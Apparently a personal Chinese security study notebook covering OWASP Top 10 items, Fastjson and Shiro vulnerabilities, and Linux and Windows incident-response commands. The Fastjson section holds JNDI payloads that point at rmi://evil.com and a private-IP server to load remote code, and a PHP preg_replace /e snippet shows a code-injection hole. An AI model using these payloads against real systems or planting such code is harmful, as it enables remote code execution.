<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">不安全的设计</span><br><span class="line">开发软件时，在关键身份验证、访问控制、业务逻辑和关键部位没有进行安全的设计</span><br><span class="line">业务逻辑体现</span><br><span class="line">	支付逻辑</span><br><span class="line">	密码找回</span><br><span class="line">	验证码暴力破解</span><br><span class="line">	验证码重复使用</span><br><span class="line">	验证码客户端回显</span><br><span class="line">	验证码绕过</span><br><span class="line">	验证码自动识别</span><br><span class="line">支付逻辑漏洞	设计购买、支付等方面的功能除就有可能存在支付漏洞</span><br><span class="line">	修改支付价格</span><br><span class="line">	修改支付状态</span><br><span class="line">	修改购买数量</span><br><span class="line">	修改优惠卷、积分</span><br><span class="line">	修改支付接口</span><br><span class="line">	多重替换支付</span><br><span class="line">	重复支付</span><br><span class="line">	最小额支付</span><br><span class="line">	最大额支付问题</span><br><span class="line">	无限制试用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">安全配置不当</span><br><span class="line">不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的向西错误信息</span><br><span class="line">不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且需要及时修补和升级他们</span><br><span class="line">可能存在的风险点</span><br><span class="line">	应用程序启用或者安装了不必要的安全功能</span><br><span class="line">	默认账户名和密码没有修改</span><br><span class="line">	应用软件已国企或出了新版本未更新</span><br><span class="line">	应用程序服务器，应用程序框架等未进行安全配置</span><br><span class="line">	错误处理机制披露大量敏感信息</span><br><span class="line">	对于更新的系统，禁用或不安全地配置安全功能</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用含有已知漏洞组件</span><br><span class="line">组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">识别和认证失败</span><br><span class="line">通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其他开发缺陷来暂时性或永久性冒充其他用户的身份。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">软件和数据完整性失败</span><br><span class="line">软件和数据完整性故障与不能防止完整性违规的代码和基础设施有关。		下软件hash值匹配  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不足的日志记录和监控</span><br><span class="line">不足的日志记录和监控，以及事件响应确实或无效的集成，是攻击者能够近一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。</span><br><span class="line">	未记录可审计性事件 登录、登陆失败、高额交易</span><br><span class="line">	告警和错误事件未能产生不足和不清晰的日志信息</span><br><span class="line">	日志信息仅在本地存储</span><br><span class="line">	没有利用应用系统和api的日志信息来监控可疑活动</span><br><span class="line">	对于实时或准实时的攻击，应用程序无法检测、处理和告警</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器端请求伪造</span><br><span class="line">攻击者能够从易受攻击的Web应用陈虚谷发送精心设计的请求对其他网站进行攻击</span><br><span class="line">A让B帮忙访问C</span><br></pre></td></tr></table></figure>

<h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">idea2020 maven3.6</span><br><span class="line">maven下载加个环境变量</span><br><span class="line"></span><br><span class="line">修改/conf/settings.xml</span><br><span class="line">	仓库位置	斜杠方向改下</span><br><span class="line">      &lt;localRepository&gt;D:/maven_jar/repository&lt;/localRepository&gt;</span><br><span class="line">    镜像 &lt;mirrors&gt;标签中添加</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">      &lt;id&gt;nexus-aliyun&lt;/id&gt;</span><br><span class="line">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">      &lt;name&gt;Nexus aliyun&lt;/name&gt;</span><br><span class="line">      &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">	项目根目录下 mvn compile 此时就会下载项目的jar文件</span><br><span class="line">	执行main方法</span><br><span class="line">		mvn exec:java -Dexec.mainClass=&quot;com.xxxx.demo.Hello&quot;</span><br><span class="line">		</span><br><span class="line">java项目选择org.apache.maven.archetypes:maven-archetype-quickstart</span><br><span class="line">web项目选择org.apache.maven.archetypes:maven-archetype-webapp</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230417232216350.png" alt="image-20230417232216350"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目setting配置</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1688006810775.png" alt="1688006810775"></p>
<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1Ab4y1d7w1</span><br><span class="line">fastjson  json和java的object对象</span><br><span class="line">实现一个java对象</span><br><span class="line">	属性</span><br><span class="line">	setter getter</span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.213.153:9999/dnslog&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">autotype机制 记录原始类型</span><br><span class="line">这里就可以做恶意攻击 引入com.sun.rowset.JdbcRowSetImpl这是个实现继承 implement的类有个属性dataSourceName可以调用rmi服务器</span><br><span class="line">	rmi服务器 一个机器 执行 另一个机器  给的命令   不回显</span><br><span class="line">	搭建一个rmi服务器 github开源项目 这地方踩坑 开源项目里maven的plugin jdk版本   		要么升级jdk版本要么去改setting依赖</span><br><span class="line">	搭建攻击服务器 用runtime和process那两个类去编写java恶意文件再编译成class文件 用SimpleHTTPServer去开个http服务</span><br><span class="line"></span><br><span class="line">抓包修改进行攻击</span><br><span class="line"></span><br><span class="line">1.2.24版本</span><br><span class="line">1.2.25版本 checkautotype机制	黑白名单检测</span><br><span class="line">	特殊处理 Lxxxx; ---&gt; Lxxx;</span><br><span class="line">	</span><br><span class="line">1.2.47 autotype不开启 全局缓存 fastjson cache设置为true--&gt;val对应的class到全局缓存中</span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shiro框架 shiro 1.2.24</span><br><span class="line">remember me 功能		cookie 很大</span><br><span class="line">aes加密 密钥泄露在函数里面</span><br></pre></td></tr></table></figure>

<h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">事件分类</span><br><span class="line">    应用层 数据篡改 挂马 webshell</span><br><span class="line">    主机层 挖矿 对外ddos 勒索病毒</span><br><span class="line">    网络层 ddos cc 劫持</span><br><span class="line">    数据层 数据库信息泄露 内部人员</span><br><span class="line">    </span><br><span class="line">应急响应之殇</span><br><span class="line"> 	安全事件现场被破坏 缺少日志集中管理或没有开启日志 缺少日常安全巡检 弱口令之殇 历史安全事件后遗症 安全设备当摆设 缺少安全运营人员 资产管理混乱 缺少对安全事件的跟踪与响应能力</span><br><span class="line"> 	管理制度问题 多人持有重要资产的权限</span><br><span class="line"> 	 安全设备发现问题的能力有限</span><br><span class="line"></span><br><span class="line">目标		拔网线</span><br><span class="line">	阻断黑客攻击对整个安全事件发生的过程进行还原 找到问题发生的根源 并采取对应补救措施 避免类似事件发生</span><br><span class="line">	1.判断应急是否是被成功入侵的安全事件</span><br><span class="line">	2.阻断黑客攻击</span><br><span class="line">	3.找出攻击者的第一入口点 提取恶意样本</span><br><span class="line">	4.帮助客户梳理攻击者的攻击路线 提供漏洞修复方案</span><br><span class="line"></span><br><span class="line">应急响应流程</span><br><span class="line">	1.事件判断 判断是否为安全事件 何种安全事件 勒索 挖矿 断网 ddos等</span><br><span class="line">	2.临时处置 给出客户处置建议 断网隔离 保护现场环境</span><br><span class="line">	3.信息收集分析 收集客户信息合中毒主机信息 包括样本 日志分析 进程分析 启动项分析 样本分析</span><br><span class="line">	4.清理处置 直接杀掉进程 删除文件 打补丁 抑或是修复文件</span><br><span class="line">	5.产出报告 整理并输出完整的安全事件报告</span><br><span class="line">	</span><br><span class="line">应急前沟通</span><br><span class="line">	1.现象是什么 如何发现的</span><br><span class="line">	2.什么时候</span><br><span class="line">	3.是否有物理隔开(断网)</span><br><span class="line">	4.受害机器哪个 几台 最先是哪台</span><br><span class="line">	5.对外有哪些服务</span><br><span class="line">	6.是否处于用一个内网</span><br><span class="line">	7.操作系统类型 是否有公网映射业务 远程管理方式 网络边界有没有流量监控设备 主机侧是否有EDR等安全设备</span><br><span class="line"></span><br><span class="line">要点</span><br><span class="line">	1.了解常见端口的攻击手法</span><br><span class="line">	2.不要相信客户说的话 </span><br><span class="line">	</span><br><span class="line">常见攻击漏洞</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425105425151.png" alt="image-20230425105425151"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常见组件漏洞</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425105542529.png" alt="image-20230425105542529"></p>
<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425105933648.png" alt="image-20230425105933648"></p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">关键目录</span><br><span class="line">    /etc/passwd				用户信息文件</span><br><span class="line">    /etc/rc.d/rc.local		开机启动项</span><br><span class="line">    /root/.ssh				root用户ssh公钥和私钥			私钥可能不在</span><br><span class="line">    /tmp					系统或用户临时文件的目录</span><br><span class="line">    /etc/hosts				本地IP地址域名解析文件		解析到本地 杀毒软件不能更新</span><br><span class="line">    /etc/init.d/			开机启动项					1-6不同文件</span><br><span class="line">常用命令</span><br><span class="line">	ls -alt		全部 列表 排序</span><br><span class="line">	free -h		查看内存使用情况</span><br><span class="line">	ps auxf或top	查看系统进程及子进程</span><br><span class="line">	netstat	-antpl	查看网络连接	需要root权限才能看pid</span><br><span class="line">		根据pid	ls -alh /proc/pid的值</span><br><span class="line">	lsof -i:port	查看端口打开的文件</span><br><span class="line">	lsof -p pid		查看进程打开的文件</span><br><span class="line">	lsof -u root	查询用户打开的文件</span><br><span class="line">	chattr	修改文件属性</span><br><span class="line">	lsattr	显示文件属性</span><br><span class="line">	启动项排查</span><br><span class="line">		cat /etc/rc.local</span><br><span class="line">		ls -alt /etc/profile.d/*.sh</span><br><span class="line">	grep</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425140105688.png" alt="image-20230425140105688"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">	history cat ~/.bash_history		查看历史命令</span><br><span class="line">	rpm -Va、dpkg -verify		校验RPM包</span><br><span class="line">		S	对应文件大小不一致</span><br><span class="line">		M	文件权限和所有权不一致</span><br><span class="line">		5	对应MD5不一致</span><br><span class="line">		D	设备号和驱动不一致</span><br><span class="line">		L	文件符号连接内容不一致</span><br><span class="line">		U	文件所有者不一致</span><br><span class="line">		G	文件群组不一致</span><br><span class="line">		T	文件修改时间不一致</span><br><span class="line">		SM5!!</span><br><span class="line">	stat	查看文件(文件夹)详细信息</span><br><span class="line">	find / -mtime 0 -name *.jsp	查找/目录下指定天数修改的指定类型文件</span><br><span class="line">	find / -ctime 0 -name *.jsp	查找/目录下指定天数新增的指定类型文件</span><br><span class="line">	diff -c 1.txt 2.txt  	比较文件差异</span><br><span class="line">	查找隐藏进程</span><br><span class="line">		ps -ef | awk &#x27;&#123;print $2&#125;&#x27; | sort -n | uniq &gt; ps.p</span><br><span class="line">		ls /proc | sort -n | uniq &gt; proc.p</span><br><span class="line">		diff ps.p proc.p</span><br><span class="line">	last	用户登录历史</span><br><span class="line">	lastb	用户登录失败			ssh爆破</span><br><span class="line">	lastlog	用户最近一次登录信息</span><br><span class="line"></span><br><span class="line">日志分析</span><br><span class="line">	内核和系统日志</span><br><span class="line">		syslog管理 配置文件 /etc/syslog.conf</span><br><span class="line">	用户日志</span><br><span class="line">		记录系统用户登录登出信息 包括用户名账号 登陆时间 源ip</span><br><span class="line">	应用日志</span><br><span class="line">		程序运行过程中各个事件</span><br><span class="line"></span><br><span class="line">用户日志</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425142341515.png" alt="image-20230425142341515"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo grep &quot;sshd.*Accept.*from &lt;ip_address&gt;&quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;		查找登陆成功</span><br><span class="line">grep &quot;useradd&quot; /var/secure</span><br><span class="line">grep &quot;userdel&quot; /var/secure</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">应急工具</span><br><span class="line">Busybox	集成300多个linux命令的工具集</span><br><span class="line">	./busybox netstat -antpl</span><br><span class="line">unhide	yum安装</span><br><span class="line">	检测发现那些借助rootkit及其他技术隐藏TCP/UDP端口的命令行工具</span><br><span class="line">chkrootkit</span><br><span class="line">	linux下检RootKit的脚本</span><br><span class="line">Rkhunter</span><br><span class="line">ClamAV</span><br><span class="line">	检测木马 病毒 恶意软件和其他恶意威胁的开源防病毒引擎</span><br><span class="line">河马webshell查杀工具</span><br><span class="line">	https://www.shellpub.com/</span><br><span class="line">内存马查杀</span><br><span class="line">	https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></table></figure>

<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">常用命令</span><br><span class="line">regedit			注册表</span><br><span class="line">Taskmgr			任务管理器</span><br><span class="line">Msconfig		系统配置(包含启动项)</span><br><span class="line">eventvwr.msc	事件查看器</span><br><span class="line">compmgmt.msc	计算机管理(本地用户和组)</span><br><span class="line">gpedit.msc		本地组策略</span><br><span class="line">taskschd.msc	计划任务</span><br><span class="line">lusrmgr.msc		本地用户和组</span><br><span class="line"></span><br><span class="line">net user	本机用户列表</span><br><span class="line">net localgroup administrators	本机管理员</span><br><span class="line">net session 	当前会话</span><br><span class="line">net start		查看当前运行的服务</span><br><span class="line">net use		远程连接</span><br><span class="line">net share	当前用户下的共享目录</span><br><span class="line">%UserProfile%\Recent、%APPDATA%\Microsoft\Windows\Recent		最近打开的文件</span><br><span class="line">findstr /m /i /s &quot;hello&quot; *.txt		查找文件中字符串</span><br><span class="line"></span><br><span class="line">netstat -anp		查看网络连接</span><br><span class="line">systeminfo			操作系统项目配置信息		修补程序</span><br><span class="line"></span><br><span class="line">Wmic process		获取系统进程信息</span><br><span class="line">wmic process where name=&quot;cmd.exe&quot; get process,executablepath,name		根据应用程序查找PID</span><br><span class="line">wmic process where processid=&quot;4296&quot; get executablepath,name			根据PID查找应用程序</span><br><span class="line"></span><br><span class="line">tasklist	获取系统进程信息</span><br><span class="line">	tasklist /m dll名称	查询特定dll调用情况</span><br><span class="line"></span><br><span class="line">certutil -hashfile %样本exe% MD5	计算样本MD5</span><br><span class="line"></span><br><span class="line">敏感目录</span><br><span class="line">%WINDIR%</span><br><span class="line">%WINDIR%\system32</span><br><span class="line">%TEMP%&quot;</span><br><span class="line">%LOCALAPPDATA%</span><br><span class="line">%APPDATA%</span><br><span class="line"></span><br><span class="line">日志分析	eventvwr</span><br><span class="line">	系统日志 %SystemRoot%System32WinevtLogsSystem.evtx</span><br><span class="line">		ID 12 	系统启动</span><br><span class="line">		ID 6005	事件日志服务已启动</span><br><span class="line">		ID 6006	事件日志服务已停止</span><br><span class="line">		ID 13	系统关闭</span><br><span class="line">	安全日志 %SystemRoot%System32WinevtLogsSecurity.evtx</span><br><span class="line">		用户登录登出 系统资源使用 系统策略改变事件 须具备管理员权限</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425150957148.png" alt="image-20230425150957148"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">		事件id每个win系统不一致</span><br><span class="line">	应用程序日志 %SystemRoot%System32WinevtLogsApplication.evtx</span><br><span class="line">应急工具</span><br><span class="line">	PCHunter 内核监控软件	查看内核文件、驱动模块、隐藏进程、注册表</span><br><span class="line">	Autoruns 登录加载程序、驱动程序加载、服务启动、计划任务等Windows中各种方面的启动项</span><br><span class="line">	Process monitor 监控程序的操作</span><br><span class="line">	Microsoft Network Monitor	网络流量监控软件</span><br><span class="line">	Everything</span><br><span class="line">	sysmon	系统监控工具</span><br><span class="line">威胁情报平台&amp;样本分析</span><br><span class="line">	奇安信威胁情报中心</span><br><span class="line">	微步在线社区</span><br><span class="line">	Virus total</span><br><span class="line">	IBM XFORCE</span><br><span class="line">BeaconEye	扫描Cobalt Strike内存特征 并进行Beacon Config扫描解析对应的Beacon信息</span><br><span class="line">	https://github.com/CCob/BeaconEye</span><br></pre></td></tr></table></figure>

<h3 id="天眼"><a href="#天眼" class="headerlink" title="天眼"></a>天眼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">分析平台 流量传感器 文件威胁鉴定器</span><br><span class="line"></span><br><span class="line">分析平台</span><br><span class="line">	威胁感知</span><br><span class="line">	调查分析</span><br><span class="line">	场景化分析</span><br><span class="line">文件威胁鉴定器</span><br><span class="line">	静态检测</span><br><span class="line">	动态监测</span><br><span class="line">流量传感器</span><br><span class="line">	入侵攻击检测</span><br><span class="line">	威胁情报匹配</span><br><span class="line">	文件还原</span><br><span class="line">	数据采集</span><br><span class="line">天擎</span><br><span class="line">	EDR联动</span><br><span class="line">	终端响应</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">天眼告警监测分析</span><br><span class="line">	信息泄露</span><br><span class="line">		敏感文件</span><br><span class="line">            备份文件泄露</span><br><span class="line">            数据库配置泄露</span><br><span class="line">            phpinfo泄露</span><br><span class="line">            .svn .git swp 脚本源码泄露</span><br><span class="line">            版本信息泄露</span><br><span class="line">            phpinfo文件泄露</span><br><span class="line">       	目录遍历</span><br><span class="line">       		目录穿越(../../) 目录列表(响应体Directory触发规则)</span><br><span class="line">   	弱口令</span><br><span class="line">   		邮件弱口令 IMAP POP3 STMP</span><br><span class="line">   		数据库弱口令	redis mysql sqlserver</span><br><span class="line">   		中间件弱口令	Tomcat weblogic jboss</span><br><span class="line">   		basic认证若口令</span><br><span class="line">   		web弱口令</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="hw笔试1"><a href="#hw笔试1" class="headerlink" title="hw笔试1"></a>hw笔试1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jboss 反序列化 未授权 弱口令</span><br><span class="line">jboss </span><br><span class="line">	EJBlnvokerServlet反序列化漏洞CVE-2013-4810</span><br><span class="line">	CVE-2015-7501</span><br><span class="line">JBOSSMQ JMS反序列化漏洞影响版本 CVE-2017-7504</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">php preg_replace</span><br><span class="line">	https://blog.csdn.net/m0_64378913/article/details/124894598</span><br><span class="line">	https://www.mianshigee.com/note/detail/6654ulw/</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;		//其中的全局变量\$_GET还可以是\$_REQUEST等其他预定义超全局变量。</span><br><span class="line">	$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">	preg_replace(&quot;/\[(.*)\]/e&quot;,&#x27;\\1&#x27;,$code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo&quot;?code=[phpinfo()]&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">?code=[phpinfo();]</span><br><span class="line">当$pattern处第一个参数存在e修饰时，$replacement的值会被当成PHP代码来执行</span><br><span class="line">匹配[]里面的内容 当正则存在e修饰时 匹配出来的内容会执行php函数 \\1指代第一个匹配出来的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat 幽灵猫 文件包含</span><br></pre></td></tr></table></figure>

